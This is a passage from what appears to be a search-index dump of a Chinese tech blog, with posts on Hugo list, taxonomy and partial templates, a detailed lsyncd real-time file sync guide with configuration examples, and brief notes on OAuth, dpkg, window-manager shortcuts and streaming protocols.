会依次从以下路径列表中查找可用的内容视图，将找到的第一个模板文件来作为渲染模板\n/layouts/TYPE/VIEW.html\n/layouts/default/VIEW.html\n/themes/THEME/layouts/TYPE/VIEW.html\n/themes/THEME/layouts/default/view.html\n假定我们要为内容类型 post 和 project 分别创建内容视图 li.html  ，则对应的模板文件路径为：/layouts/post/li.html 和 /layouts/project/li.html 。如果我们在网站首页使用如下代码罗列所有文档\n\n{{ range .Data.Pages }}\n{{ .Render \"li\"}}\n{{ end }}\n\n其中 {{ .Render \"li\" }} 表示引用当前内容文档对应内容视图 li.html （post 和 project 使用各自的内容视图文件），在内容视图 li.html 中可以访问任何页面变量，下面是 li.html 示例\n\nli\na href=\"{{ .Permalink }}\"{{ .Title }}/a\ndiv class=\"meta\"{{ .Date.Format \"Mon, Jan 2, 2006\" }}/div\n/li\n\n 列表模板\n\nHugo 使用列表模板（list template）渲染多个被罗列的内容文档，比如：分类标签页面和 Section 页面通常需要罗列逻辑上从属于该类别的所有文档。值得注意的是，不同于单页文档总是被内容文档填充，列表模板一般却不会被内容文档填充（下文会介绍什么情况下列表模板也会填充内容文档）。\n\nHugo 中列表模板常见的应用场景有：Section 列表页、Taxonomy 列表页、Section RSS 以及 Taxonomy RSS等（注：网站首页虽然也是列表页，可因其特殊性，需要使用特定的模板渲染）。这些页面渲染后的 URL 路径分别如下\n\nSection 列表页\n\n  baseURL/SECTION/ ，例如：http://1.com/post/\n\nTaxonomy 列表页\n\n  baseURL/PLURAL/TERM/ ，例如：http://1.com/tags/python/\n\nSection RSS\n\n  baseURL/SECTION/index.html ，例如：http://1.com/post/index.html\n\nTaxonomy RSS\n\n  baseURL/PLURAL/TERM/index.html ，例如：http://1.com/tags/python/\n\n此外，Hugo 会依次从路径列表中查找可用的列表模板，将找到的第一个列表模板文件来作为渲染模板。以上介绍的常见列表页面的查找路径如下\nSection 列表\n  /layouts/section/SECTION.html\n  /layouts/default/section.html\n  /layouts/default/list.html\n  /themes/THEME/layouts/section/SECTION.html\n  /themes/THEME/layouts/default/section.html\n  /themes/THEME/layouts/default/list.html\nTaxonomy 列表\n  /layouts/taxonomy/SINGULAR.html\n  /layouts/default/taxonomy.html\n  /layouts/default/list.html\n  /themes/THEME/layouts/taxonomy/SINGULAR.html\n  /themes/THEME/layouts/default/taxonomy.html\n  /themes/THEME/layouts/default/list.html\nSection RSS\n  /layouts/section/SECTION.rss.xml\n  /layouts/default/rss.xml\n  /themes/THEME/layouts/section/SECTION.rss.xml\n  /themes/THEME/layouts/default/rss.xml\nTaxonomy RSS\n  /layouts/taxonomy/SINGULAR.rss.xml\n  /layouts/default/rss.xml\n  /themes/THEME/layouts/taxonomy/SINGULAR.rss.xml\n  /themes/THEME/layouts/default/rss.xml\n从上面模板的查找路径可以看出，Hugo 首先会查找为特定 SECTION 和 TAXONOMY 定义的模板文件，如果查找失败，会再查找 Section 和 Taxonomy 通用的模板文件，如果还是找不到就使用 layouts/defaults/list.html 和 layouts/defaults/rss.xml 。\n\n既然知道了列表模板的用途，也知道了模板文件的查找路径，那么列表模板文件中该写些什么呢？列表文件也是一个普通的模板文件，在模板中可以使用任何 Go 内置模板函数，还可以访问网站模板变量和页面模板变量（用于 Taxonomy 的模板还可以访问代表当前分类的变量 .Data.Singular ）。根据列表模板的用途一般来说会在模板中为内容文档创建一个展示列表，此外也许希望对这个内容文档分类或者剔除某些文档，利用简洁而强大的 Go 模板方法可以自定义任何复杂的列表页面。下面是一个用于 Section 的列表模板示例\n\n{{ partial \"header.html\" . }}\n{{ partial \"subheader.html\" . }}\n\nsection id=\"main\"\n  div\n   h1 id=\"title\"{{ .Title }}/h1\n        ul id=\"list\"\n            {{ range .Data.Pages }}\n                {{ .Render \"li\"}}\n            {{ end }}\n        /ul\n  /div\n/section\n\n{{ partial \"footer.html\" . }}\n\n分类模板\n\nHugo 使用分类模板（taxonomy terms template）来渲染当前分类下的所有标签。\n\n要注意同Taxonomy 列表页相区分，Taxonomy 列表页用来罗列属于某个标签下所有的内容文档，优先查找模/layouts/taxonomy/SINGULAR.html 作为该标签列表页的模板，且将页面渲染于 baseURL/PLURAL/TERM/ 。而分类模板页面是用来罗列当前分类下所有标签的，优先查找 /layouts/taxonomy/SINGULAR.terms.html 作为页面模板，且渲染于 baseURL/PLURAL/ 。\n\nHugo 会依次从路径列表中查找可用的模板，将找到的第一个模板文件来作为渲染模板\n\n/layouts/taxonomy/SINGULAR.terms.html\n/layouts/default/terms.html\n/themes/THEME/layouts/taxonomy/SINGULAR.terms.html\n/themes/THEME/layouts/default/terms.html\n\n如果以上模板都不存在，Hugo 就不会渲染分类标签页面。换句话说，分类标签页面的渲染也不一定必须单独使用一个模板文件，我们可以在页面侧边栏之类的地方来渲染分类标签（比如：侧边栏实现一个标签云）。\n\n分类模板中除了可以访问网站变量和页面变量外，还有一些关于分类标签的变量可供我们使用：\n\n.Data.Singular\t\t\t\t\t\t分类的单数名称，比如：tag\n.Data.Plural\t\t\t\t\t\t分类的复数名称，比如：tags\n.Data.Pages\t\t\t\t\t\t\t属于当前分类的所有页面\n.Data.Terms\t\t\t\t\t\t\t属于当前分类的所有标签\n.Data.Terms.Alphabetical\t\t\t属于当前分类的所有标签（字母序）\n.Data.Terms.ByCount\t\t\t\t\t属于当前分类的所有标签（根据标签下文档数量排序）\n\n下面是一个示例分类模板，该模板罗列出了当前分类下的所有标签，并给出了标签下所有文档的链接\n\n{{ partial \"header.html\" . }}\n{{ partial \"subheader.html\" . }}\n\nsection id=\"main\"\n  div\n    h1 id=\"title\"{{ .Title }}/h1\n\n    {{ $data := .Data }}\n    {{ range $key,$value := .Data.Terms.ByCount }}\n    h2a href=\"{{ .Site.LanguagePrefix }}/{{ $data.Plural }}/{{ $value.Name | urlize }}\"{{ $value.Name }}/a {{ $value.Count }}/h2\n    ul\n    {{ range $value.Pages.ByDate }}\n      lia href=\"{{ .Permalink }}\"{{ .Title }}/a/li\n    {{ end }}\n    /ul\n    {{ end }}\n  /div\n/section\n\n{{ partial \"footer.html\" . }}\n\n 片段模板\n\nHugo 使用片段模板（partial template）作为其它模板文件的原材料，比如首页模板、单页模板、列表模板等这些模板通常会使用片段模板来创建。这里之所以将片段模板比作原材料，是因为片段模板通常包含了其它模板中的公共部分，反过来说，我们应该将多个模板中的公共内容分离出来创建片段模板文件，然后可以在其它模板中引用该片段文件。使用片段模板的好处在于，不需要重复定义相同的模板内容，而且片段模板十分有利于主题资源的开发，主题中应该将那些想要让用户覆盖的模板内容单独作为一个片段模板，这样主题的使用者只需要定义相同的片段模板就可以对主题片段模板进行替换，片段模板文件是比普通模板文件更加细粒度的模板内容容器。\n\n如何创建片段模板呢？Hugo 默认将模板目录 /layouts/partials/ 及其子目录中的模板文件看作片段模板，片段模板的内容如同普通模板一样可以访问各种模板变量和模板函数，不过片段模板可以访问到的模板变量取决于引用该模板时传入了怎样的变量进来（后面会有讲，如何引用片段模板以及如何传递变量到片段模板）。在网站中最为常见的片段模板也许就是网页头和网页脚，因为网页头和网页脚在网站大多数页面中都是相同的，将其分离于片段模板中是明智的选择，假设我们创建了 /layouts/partials/header.html 和 /layouts/partials/footer.html 片段模板文件，它们的内容分别为\n\n!DOCTYPE html\nhtml class=\"no-js\" lang=\"en-US\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\"\nhead\n    meta charset=\"utf-8\"\n\n    {{ partial \"meta.html\" . }}\n\n    base href=\"{{ .Site.BaseURL }}\"\n    title {{ .Title }} : spf13.com /title\n    link rel=\"canonical\" href=\"{{ .Permalink }}\"\n    {{ if .RSSLink }}link href=\"{{ .RSSLink }}\" rel=\"alternate\" type=\"application/rss+xml\" title=\"{{ .Title }}\" /{{ end }}\n\n    {{ partial \"headincludes.html\" . }}\n/head\nbody lang=\"en\"\n\n和\n\nfooter\n  div\n    p\n    \u0026copy; 2013-14 Steve Francia.\n    a href=\"http://creativecommons.org/licenses/by/3.0/\" title=\"Creative Commons Attribution\"Some rights reserved/a;\n    please attribute properly and link back. Hosted by a href=\"http://servergrove.com\"ServerGrove/a.\n    /p\n  /div\n/footer\nscript type=\"text/javascript\"\n\n  var gaq = gaq || [];\n  gaq.push(['setAccount', 'UA-XYSYXYSY-X']);\n  gaq.push(['trackPageview']);\n\n  (function() {\n    var ga = document.createElement('script');\n    ga.src = ('https:' == document.location.protocol ? 'https://ssl' :\n        'http://www') + '.google-analytics.com/ga.js';\n    ga.setAttribute('async', 'true');\n    document.documentElement.firstChild.appendChild(ga);\n  })();\n\n/script\n/body\n/html\n\n以上模板内容除了常规的 HTML 代码外，还出现了像 {{ partial \"meta.html\" . }} 这样的模板语句，这条语句在这里的作用是引用片段模板 meta.html 到当前模板文件中（即 header.html 片段模板文件），就是说 Hugo 允许我们在片段模板中再次引用片段模板。\n\n下面让我们研究一下，如何引用一个片段模板文件，引用片段模板的语法为：{{ partial \"path/to/file.html\" variables }} ，其中 path/to/file.html 表示被引用的片段模板文件相对于 /layouts/partials/ 目录的路径，比如想要引用 /layouts/partials/post/sidebar.html ，则对应的引用路径为 post/sidebar.html 。其中 variables 表示要传入片段模板的变量（片段模板除了这些传入的变量，是无法访问其它变量的），通常我们会将代表当前模板内所有变量的 . 作为 variables 传入片段模板中。\n\n有没有想过，很多模板引用相同的片段模板文件，在生成网页时，这些片段模板是不是在每个引用模板中都要重新渲染一次呢？有没有办法减少片段模板的渲染次数，毕竟片段模板生成的网页片段除了根据传入变量不同会有改变外，基本的网页结构是相似的。如果想要让 Hugo 提升片段模板的渲染效率（Hugo 会自动缓存已经渲染好的片段模板供后续使用），可以在引用模板文件时用 partialCached 来代替 partial ，并且 Hugo 还支持用户按照类别缓存片段模板，比如： {{ partialCached \"footer.html\" . .Section }} 的意思是，为每个 Section 渲染一次 footer.html 模板。\n\n模板调试\n\n模板编写中错误在所难免，可以使用模板函数 printf 调试模板变量，下面是几个常见调试样例\n\n{{ printf \"%v\" . }}\n{{ printf \"%#v\" $.Site }}\n{{ printf \"%#v\" .Permalink }}\n{{ range .Data.Pages }}\n    {{/ The context, \".\", is now a Page /}}\n    {{ printf \"%#v\" . }}\n{{ end }}\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 lsyncd实时同步搭建指南——取代rsync+inotify","title":"Linux命令 lsyncd","text":"1.1 inotify + rsync\n\n最近一直在寻求生产服务服务器上的同步替代方案，原先使用的是inotify + rsync，但随着文件数量的增大到100W+，目录下的文件列表就达20M，在网络状况不佳或者限速的情况下，变更的文件可能10来个才几M，却因此要发送的文件列表就达20M，严重减低的带宽的使用效率以及同步效率；更为要紧的是，加入inotifywait在5s内监控到10个小文件发生变化，便会触发10个rsync同步操作，结果就是真正需要传输的才2-3M的文件，比对的文件列表就达200M。使用这两个组合的好处在于，它们都是最基本的软件，可以通过不同选项做到很精确的控制，比如排除同步的目录，同步多个模块或同步到多个主机。\n1.2 sersync\n\n后来听同事说 sersync 这么个工具可以提高同步的性能，也解决了同步大文件时出现异常的问题，所以就尝试了一下。sersync是国内的一个开发者开源出来的，使用c++编写，采用多线程的方式进行同步，失败后还有重传机制，对临时文件过滤，自带crontab定时同步功能。网上看到有人说性能还不错，说一下我的观点：\n\n    国产开源，文档不是很全，在2011年之后就没更新了（googlecode都要快关闭了，其实可以转交其他人维护），网上关于它的使用和讨论都止于10年了\n    采用xml配置文件的方式，可读性比较好，但是有些原生的有些功能没有实现就没法使用了\n    无法实现多目录同步，只能通过多个配置文件启动多个进程\n    文件排除功能太弱。这个要看需求，不是每个人都需要排除子目录。而对于我的环境中，这个功能很重要，而且排除的规则较多\n    虽然提供插件的功能，但很鸡肋，因为软件本身没有持续更新，也没有看到贡献有其它插件出现（可能是我知识面不够，还用不到里面的refreshCDN plugin）。\n\n虽然不懂c++，但大致看了下源码 FileSynchronize，拼接rsync命令大概在273行左右，最后一个函数就是排除选项，简单一点可以将--exclude=改成--eclude-from来灵活控制。有机会再改吧。\n\n另外，在作者的文章 Sersync服务器同步程序 项目简介与设计框架 评论中，说能解决上面 rsync + inotify中所描述的问题。阅读了下源码，这个应该是没有解决，因为在拼接rsync命令时，后面的目的地址始终是针对module的，只要执行rsync命令，就会对整个目录进行遍历，发送要比对的文件列表，然后再发送变化的文件。sersync只是减少了监听的事件，减少了rsync的次数——这已经是很大的改进，但每次rsync没办法改变。（如有其它看法可与我讨论）\n\n其实我们也不能要求每一个软件功能都十分健全，关键是看能否满足我们当下的特定的需求。所谓好的架构不是设计出来的，而是进化来的。目前使用sersync2没什么问题，而且看了它的设计思路应该是比较科学的，特别是过滤队列的设计。双向同步看起来也是可以实现。\n1.3 lsyncd\n\n废话说这么多，本文就是介绍它了。有些博客说lsyncd是谷歌开源的，实际不是了，只是托管在了googlecode上而已，幸运的是已经迁移到github了：https://github.com/axkibe/lsyncd 。\n\nLysncd 实际上是lua语言封装了 inotify 和 rsync 工具，采用了 Linux 内核（2.6.13 及以后）里的 inotify 触发机制，然后通过rsync去差异同步，达到实时的效果。我认为它最令人称道的特性是，完美解决了 inotify + rsync海量文件同步带来的文件频繁发送文件列表的问题 —— 通过时间延迟或累计触发事件次数实现。另外，它的配置方式很简单，lua本身就是一种配置语言，可读性非常强。lsyncd也有多种工作模式可以选择，本地目录cp，本地目录rsync，远程目录rsyncssh。\n\n实现简单高效的本地目录同步备份（网络存储挂载也当作本地目录），一个命令搞定。\n使用 lsyncd 本地目录实时备份\n\n这一节实现的功能是，本地目录source实时同步到另一个目录target，而在source下有大量的文件，并且有部分目录和临时文件不需要同步。\n2.1 安装lsyncd\n\n安装lsyncd极为简单，已经收录在ubuntu的官方镜像源里，直接通过apt-get install lsyncd就可以。\n在Redhat系（我的环境是CentOS 6.2 x8664 ），可以手动去下载 lsyncd-2.1.5-6.fc21.x8664.rpm，但首先你得安装两个依赖yum install lua lua-devel。也可以通过在线安装，需要epel-release扩展包：\n\n    # rpm -ivh http://dl.fedoraproject.org/pub/epel/6/x8664/epel-release-6-8.noarch.rpm\n    # yum install lsyncd\n\n源码编译安装\n\n从源码编译安装可以使用最新版的lsyncd程序，但必须要相应的依赖库文件和编译工具：yum install lua lua-devel asciidoc cmake。\n\n从 googlecode lsyncd 上下载的lsyncd-2.1.5.tar.gz，直接./configure、make \u0026\u0026 make install就可以了。\n\n从github上下载lsyncd-master.zip 的2.1.5版本使用的是 cmake 编译工具，无法./configure：\n\n    # uzip lsyncd-master.zip\n    # cd lsyncd-master\n    # cmake -DCMAKEINSTALLPREFIX=/usr/local/lsyncd-2.1.5\n    # make \u0026\u0026 make install\n\n我这个版本编译时有个小bug，如果按照INSTALL在build目录中make，会提示：\n\n    [100%] Generating doc/lsyncd.1\n    Updating the manpage\n    a2x: failed: source file not found: doc/lsyncd.1.txt\n    make[2]:  [doc/lsyncd.1] Error 1\n    make[1]:  [CMakeFiles/manpage.dir/all] Error 2\n    make: ** [all] Error 2\n\n解决办法是要么直接在解压目录下cmake，不要mkdir build，要么在CMakeList.txt中搜索doc字符串，在前面加上${PROJECTSOURCEDIR}。\n2.2 lsyncd.conf\n\n下面都是在编译安装的情况下操作。\n2.2.1 lsyncd同步配置\n\n    # cd /usr/local/lsyncd-2.1.5\n    # mkdir etc var\n    # vi etc/lsyncd.conf\n    settings {\n        logfile      =\"/usr/local/lsyncd-2.1.5/var/lsyncd.log\",\n        statusFile   =\"/usr/local/lsyncd-2.1.5/var/lsyncd.status\",\n        inotifyMode  = \"CloseWrite\",\n        maxProcesses = 7,\n        -- nodaemon =true,\n        }\n    sync {\n        default.rsync,\n        source    = \"/tmp/src\",\n        target    = \"/tmp/dest\",\n        -- excludeFrom = \"/etc/rsyncd.d/rsyncexclude.lst\",\n        rsync     = {\n            binary    = \"/usr/bin/rsync\",\n            archive   = true,\n            compress  = true,\n            verbose   = true\n            }\n        }\n\n到这启动 lsycnd 就可以完成实时同步了，默认的许多参数可以满足绝大部分需求，非常简单。\n2.2.2 lsyncd.conf配置选项说明\n\nsync\n\n里面是定义同步参数，可以继续使用maxDelays来重写settings的全局变量。一般第一个参数指定lsyncd以什么模式运行：rsync、rsyncssh、direct三种模式：\n\n    default.rsync ：本地目录间同步，使用rsync，也可以达到使用ssh形式的远程rsync效果，或daemon方式连接远程rsyncd进程；\n    default.direct ：本地目录间同步，使用cp、rm等命令完成差异文件备份；\n    default.rsyncssh ：同步到远程主机目录，rsync的ssh模式，需要使用key来认证\n\n    source 同步的源目录，使用绝对路径。\n\n    target 定义目的地址.对应不同的模式有几种写法：\n    /tmp/dest ：本地目录同步，可用于direct和rsync模式\n    172.29.88.223:/tmp/dest ：同步到远程服务器目录，可用于rsync和rsyncssh模式，拼接的命令类似于/usr/bin/rsync -ltsd --delete --include-from=- --exclude= SOURCE TARGET，剩下的就是rsync的内容了，比如指定username，免密码同步\n    172.29.88.223::module ：同步到远程服务器目录，用于rsync模式\n    三种模式的示例会在后面给出。\n\n    init 这是一个优化选项，当init = false，只同步进程启动以后发生改动事件的文件，原有的目录即使有差异也不会同步。默认是true\n\n    delay 累计事件，等待rsync同步延时时间，默认15秒（最大累计到1000个不可合并的事件）。也就是15s内监控目录下发生的改动，会累积到一次rsync同步，避免过于频繁的同步。（可合并的意思是，15s内两次修改了同一文件，最后只同步最新的文件）\n    excludeFrom 排除选项，后面指定排除的列表文件，如excludeFrom = \"/etc/lsyncd.exclude\"，如果是简单的排除，可以使用exclude = LIST。\n    这里的排除规则写法与原生rsync有点不同，更为简单：\n            监控路径里的任何部分匹配到一个文本，都会被排除，例如/bin/foo/bar可以匹配规则foo\n        如果规则以斜线/开头，则从头开始要匹配全部\n        如果规则以/结尾，则要匹配监控路径的末尾\n        ?匹配任何字符，但不包括/\n        匹配0或多个字符，但不包括/\n        匹配0或多个字符，可以是/\n        delete 为了保持target与souce完全同步，Lsyncd默认会delete = true来允许同步删除。它除了false，还有startup、running值，请参考 Lsyncd 2.1.x ‖ Layer 4 Config ‖ Default Behavior。\n\nrsync\n\n（提示一下，delete和exclude本来都是rsync的选项，上面是配置在sync中的，我想这样做的原因是为了减少rsync的开销）\n\n    bwlimit 限速，单位kb/s，与rsync相同（这么重要的选项在文档里竟然没有标出）\n    compress 压缩传输默认为true。在带宽与cpu负载之间权衡，本地目录同步可以考虑把它设为false\n    perms 默认保留文件权限。\n    其它rsync的选项\n\n其它还有rsyncssh模式独有的配置项，如host、targetdir、rsyncpath、passwordfile，见后文示例。rsyncOps={\"-avz\",\"--delete\"}这样的写法在2.1.版本已经不支持。\n\nlsyncd.conf可以有多个sync，各自的source，各自的target，各自的模式，互不影响。\n2.3 启动lsyncd\n\n使用命令加载配置文件，启动守护进程，自动同步目录操作。\n\n    lsyncd -log Exec /usr/local/lsyncd-2.1.5/etc/lsyncd.conf\n\n2.4 lsyncd.conf其它模式示例\n\n以下配置本人都已经过验证可行，必须根据实际需要裁剪配置：\nsettings\n\n里面是全局设置，--开头表示注释，下面是几个常用选项说明：\n\n    logfile 定义日志文件\n    stausFile 定义状态文件\n    nodaemon=true 表示不启用守护模式，默认\n    statusInterval 将lsyncd的状态写入上面的statusFile的间隔，默认10秒\n    inotifyMode 指定inotify监控的事件，默认是CloseWrite，还可以是Modify或CloseWrite or Modify\n    maxProcesses 同步进程的最大个数。假如同时有20个文件需要同步，而maxProcesses = 8，则最大能看到有8个rysnc进程\n    maxDelays 累计到多少所监控的事件激活一次同步，即使后面的delay延迟时间还未到\n\n    settings {\n        logfile \t= \tFILENAME \tlogs into this file\n        pidfile \t= \tFILENAME \tlogs PID into this file\n        nodaemon \t= \ttrue \tdoes not detach\n        statusFile \t= \tFILENAME \tperiodically writes a status report to this file\n        statusInterval \t= \tNUMBER \twrites the status file at shortest after this number of seconds has passed (default: 10)\n        logfacility \t= \tSTRING \tsyslog facility, default \"user\"\n        logident \t= \tSTRING \tsyslog identification (tag), default \"lsyncd\"\n        insist \t= \ttrue \tkeep running at startup although one or more targets failed due to not being reachable.\n        inotifyMode \t= \tSTRING \tSpecifies on inotify systems what kind of changes to listen to. Can be \"Modify\", \"CloseWrite\" (default) or \"CloseWrite or Modify\".\n        maxProcesses \t= \tNUMBER \tLysncd will not spawn more than these number of processes. This adds across all sync{}s.\n}\n    settings {\n        logfile =\"/var/lsyncd.log\",\n        statusFile =\"/var/lsyncd.status\",\n        inotifyMode = \"CloseWrite\",\n        maxProcesses = 8,\n        }\n    -- I. 本地目录同步，direct：cp/rm/mv。 适用：500+万文件，变动不大\n    sync {\n        default.direct,\n        source    = \"/tmp/src\",\n        target    = \"/tmp/dest\",\n        delay = 1\n        maxProcesses = 1\n        }\n    -- II. 本地目录同步，rsync模式：rsync\n    sync {\n        default.rsync,\n        source    = \"/tmp/src\",\n        target    = \"/tmp/dest1\",\n        excludeFrom = \"/etc/rsyncd.d/rsyncexclude.lst\",\n        rsync     = {\n            binary = \"/usr/bin/rsync\",\n            archive = true,\n            compress = true,\n            bwlimit   = 2000\n            }\n        }\n    -- III. 远程目录同步，rsync模式 + rsyncd daemon\n    sync {\n        default.rsync,\n        source    = \"/tmp/src\",\n        target    = \"syncuser@172.29.88.223::module1\",\n        delete=\"running\",\n        exclude = { \".\", \".tmp\" },\n        delay = 30,\n        init = false,\n        rsync     = {\n            binary = \"/usr/bin/rsync\",\n            archive = true,\n            compress = true,\n            verbose   = true,\n            passwordfile = \"/etc/rsyncd.d/rsync.pwd\",\n            extra    = {\"--bwlimit=200\"}\n            }\n        }\n    -- IV. 远程目录同步，rsync模式 + ssh shell\n    sync {\n        default.rsync,\n        source    = \"/tmp/src\",\n        target    = \"172.29.88.223:/tmp/dest\",\n        -- target    = \"root@172.29.88.223:/remote/dest\",\n        -- 上面target，注意如果是普通用户，必须拥有写权限\n        maxDelays = 5,\n        delay = 30,\n        -- init = true,\n        rsync     = {\n            binary = \"/usr/bin/rsync\",\n            archive = true,\n            compress = true,\n            bwlimit   = 2000\n            -- rsh = \"/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no\"\n            -- 如果要指定其它端口，请用上面的rsh\n            }\n        }\n    -- V. 远程目录同步，rsync模式 + rsyncssh，效果与上面相同\n    sync {\n        default.rsyncssh,\n        source    = \"/tmp/src2\",\n        host      = \"172.29.88.223\",\n        targetdir = \"/remote/dir\",\n        excludeFrom = \"/etc/rsyncd.d/rsyncexclude.lst\",\n        -- maxDelays = 5,\n        delay = 0,\n        -- init = false,\n        rsync    = {\n            binary = \"/usr/bin/rsync\",\n            archive = true,\n            compress = true,\n            verbose   = true,\n            extra = {\"--bwlimit=2000\"},\n            },\n        ssh      = {\n            port  =  1234\n            }\n        }\n上面的内容几乎涵盖了所有同步的模式，其中第III个要求像rsync一样配置rsyncd服务端，见本文开头。第IV、V配置ssh方式同步，达到的效果相同，但实际同步时你会发现每次同步都会提示输入ssh的密码，可以通过以下方法解决：\n\n在远端被同步的服务器上开启ssh无密码登录，请注意用户身份：\n\n    user$ ssh-keygen -t rsa\n    ...一路回车...\n    user$ cd ~/.ssh\n    user$ cat idrsa.pub     authorizedkeys\n\n把idrsa私钥拷贝到执行lsyncd的机器上\n\n    user$ chmod 600 ~/.ssh/id_rsa\n    测试能否无密码登录\n    user$ ssh user@172.29.88.223\n\nlsyncd的其它功能\n\nlsyncd的功能不仅仅是同步，官方手册 Lsyncd 2.1.x ‖ Layer 2 Config ‖ Advanced onAction 高级功能提到，还可以监控某个目录下的文件，根据触发的事件自己定义要执行的命令，example是监控某个某个目录，只要是有jpg、gif、png格式的文件参数，就把它们转成pdf，然后同步到另一个目录。正好在我运维的一个项目中有这个需求，现在都是在java代码里转换，还容易出现异常，通过lsyncd可以代替这样的功能。但，门槛在于要会一点点lua语言（根据官方example还是可以写出来）。\n\n另外偶然想到个问题，同时设置了maxDelays和delay，当监控目录一直没有文件变化了，也会发生同步操作，虽然没有可rsync的文件。\n\nTO-DO：\n\n    其它同步工具：csync2，clsync，btsync，drdb 。\n    lsyncd双向同步：GlusterFS\n\n    参考\n\n        Lsyncd21Manual （本文很大一部分翻译自官网手册）\n        使用lsyncd配置数据库备份多异地同步\n        如何实时同步大量小文件\n        Lsyncd 测试远程、本地目录自动同步","tags":null},{"location":"//blog.pytool.com/Other/2016-03-29 OAuth2.0","title":"OAuth2.0","text":"OAuth 开源实现\n\n理解OAuth 2.0\n百度OAuth2.0官方参考文档\nNodejs passport\n帮你深入理解OAuth2.0协议 \n基于OAUTH2的统一认证的实例解析 - 推酷\n\n统一认证登录的有两种情况:\n一种是SSO（单点登录）效果是一次输入密码多个网站可以识别在线状态；\nSSO一般用于同一单位的多个站点的登陆状态保持，技术上一般参考CAS协议；\n\n另一种是多平台登录OAuth，效果是可以用一个账号（比如QQ账号）登录多个不同的网站。\n多平台登录一般是Oauth体系的协议，有多种认证模式但是不具备会话管理和状态保持。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 modprobe","title":"Linux内核modprobe","text":"depmod\nmodprobe","tags":null},{"location":"//blog.pytool.com/hugo/typora","title":"typora","text":"sequenceDiagram\n Alice-    Bob: Hello Bob, how are you?\n    alt is sick\n    Bob-    Alice: Not so good :(\n    else is well\n    Bob-    Alice: Feeling fresh like a daisy\n    end\n    opt Extra response\n    Bob-    Alice: Thanks for asking\n    end\n`","tags":null},{"location":"//blog.pytool.com/tool/2010-01-01 awesome ","title":"awesome","text":"打开终端 \tMod4 + Return \t \n运行命令 \tMod4 + F1 \t \n关闭当前窗口 \tMod4 + Shift + c \t \n重启awesome \tMod4 + Control + r \t \n退出awesome \tMod4 + Shift + q \t \n重绘当前窗口 \tMod4 + Shift + r \t \n\n窗口间切换 \tMod4 + j \tMod4 + k\n标签间切换 \tMod4 + Left \tMod4 + Right\n切换到标签 \tMod4 + [1-9] \t \n屏幕间切换 \tMod4 + Control + j \tMod4 + Control + k\n\n切换布局 \tMod4 + space \tMod4 + Shift + space\n切换为浮动窗口 \tMod4 + Control + space \t \n调整窗口位置 \tMod4 + Shift + j \tMod4 + Shift + k\n调整列大小 \tMod4 + h \tMod4 + l\n调整主区窗口数量 \tMod4 + Shift + h \tMod4 + Shift + l\n调整辅区窗口数量 \tMod4 + Control + h \tMod4 + Control + l","tags":null},{"location":"//blog.pytool.com/tool/2010-01-01 autohotkey ","title":"autohotkey","text":"如何学习 AutoHotkey？\n尋找Linux的AutoHotkey：Autokey差強人意\n ahk 存储数据的各种方法\n\n; ! = ALT\n; ^ = CTRL\n; + = SHIFT\n; # = WIN\n;","tags":null},{"location":"//blog.pytool.com/Post/Awesome/2016-10-04 flarum","title":"flarum","text":"Flarum 文档","tags":null},{"location":"//blog.pytool.com/tool/2010-01-01 在线工具","title":"在线工具","text":"图标工场 - 移动应用图标生成工具，一键生成所有尺寸的应用图标\n\nexplainshell\n常用命令\n\n图标搜索GlyphSearch\n\n  GlyphSearch is a tool for searching icons from Glyphicons, Font Awesome, and other popular icon font libraries\nCan I use\n  关于属性的兼容性，可以通过Can I Use查询","tags":null},{"location":"//blog.pytool.com/tool/2010-01-01 文件同步工具","title":"文件同步","text":"BTsync\nSyncthing\nSyncthing免费开源文件同步工具 - 网络资源 - 如有乐享\n\ngit clone git@github.com:syncthing/syncthing /home/ubuntu/go/src/github.com/syncthing/syncthing\n\nrsync\n\nbtsync、ownCloud，然后是seafile","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 dpkg","title":"Linux命令 dpkg","text":"sudo dpkg -I ipux.deb#查看iptux.deb软件包的详细信息，包括软件名称、版本以及大小等（其中-I等价于--info）\nsudo dpkg -c ipux.deb#查看iptux.deb软件包中包含的文件结构（其中-c等价于--contents）\nsudo dpkg -i ipux.deb#安装iptux.deb软件包（其中-i等价于--install）\nsudo dpkg -l ipux#查看iptux软件包的信息（软件名称可通过dpkg -I命令查看，其中-l等价于--list）\nsudo dpkg -L ipux#查看iptux软件包安装的所有文件（软件名称可通过dpkg -I命令查看，其中-L等价于--listfiles）\nsudo dpkg -s ipux#查看iptux软件包的详细信息（软件名称可通过dpkg -I命令查看，其中-s等价于--status）\nsudo dpkg -r ipux#卸载iptux软件包（软件名称可通过dpkg -I命令查看，其中-r等价于--remove）","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-28 RTP RTSP RTMP HLS","title":"RTSP协议、RTMP协议、HTTP协议的区别","text":"RTSP协议、RTMP协议、HTTP协议的区别\n流媒体协议介绍（rtp/rtcp/rtsp/rtmp/mms/hls）\nrtsp协议UDP、TCP、RTP三种协议的总结分析\n理论上RTSP RTMPHTTP都可以做直播和点播，但一般做直播用RTSP RTMP，做点播用HTTP。做视频会议的时候原来用SIP协议，现在基本上被RTMP协议取代了。\nRTSP、 RTMP、HTTP的共同点、区别\n共同点：\n1：RTSP RTMP HTTP都是在应用应用层。\n2：理论上RTSP RTMPHTTP都可以做直播和点播，但一般做直播用RTSP RTMP，做点播用HTTP。做视频会议的时候原来用SIP协议，现在基本上被RTMP协议取代了。\n 区别：\n1：\nRTMP: Routing Table Maintenance Protocol（路由选择表维护协议）。\nRTSP: Real Time Streaming Protocol (实时流传输协议)\nHTTP: 